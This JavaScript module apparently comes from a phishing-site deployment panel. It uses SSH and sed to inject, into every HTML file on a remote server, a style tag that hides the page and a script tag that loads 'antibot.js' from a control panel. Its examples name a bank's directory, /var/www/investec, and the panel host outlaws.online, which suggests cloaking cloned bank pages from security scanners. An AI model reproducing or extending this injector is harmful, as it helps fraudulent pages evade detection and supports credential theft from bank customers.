/**
 * Inject the antibot hide-style + script tag before </head> in every HTML file
 * under remoteDir on a VPS. Idempotent: files that already contain '__ab_hide'
 * are skipped.
 *
 * Called from:
 *   - routes/website-deploy.js  (initial deploy + quick redeploy)
 *   - services/vpsDomain.js     (attachDomainToVps — patches existing files
 *                                when a new domain is added to an existing site)
 *
 * @param {import('ssh2').Client} client   Connected ssh2 client
 * @param {string} remoteDir               Absolute path on VPS, e.g. /var/www/investec
 * @param {string} panelUrl                Base panel URL, e.g. https://outlaws.online
 * @param {(cmd:string)=>Promise<{stdout:string,stderr:string,code:number}>} sshExec
 * @returns {Promise<{ p:number, s:number }>}  patched / skipped counts
 */
async function injectAntibot(client, remoteDir, panelUrl, sshExec) {
  const abUrl   = `${panelUrl}/antibot.js`;
  const escUrl  = abUrl.replace(/[&|]/g, '\\$&');
  const snippet = `<style id="__ab_hide">html{visibility:hidden !important}</style><script src="${escUrl}"></script>`;
  const sedExpr = `s|</[hH][eE][aA][dD]>|${snippet}</head>|`;

  // Single command: find all HTMLs, skip if already patched, else sed-insert
  // before </head>. Counts propagate out of the piped subshell via the { … } group.
  const cmd = `find ${remoteDir} -type f -name "*.html" 2>/dev/null | { p=0; s=0; while IFS= read -r f; do if grep -q '__ab_hide' "$f"; then s=$((s+1)); elif sed -i '${sedExpr}' "$f" 2>/dev/null; then p=$((p+1)); fi; done; echo "p=$p s=$s"; }`;

  const res = await sshExec(client, cmd);
  const m   = /p=(\d+)\s+s=(\d+)/.exec((res.stdout || '').trim());
  return { p: m ? parseInt(m[1], 10) : 0, s: m ? parseInt(m[2], 10) : 0 };
}

module.exports = { injectAntibot };
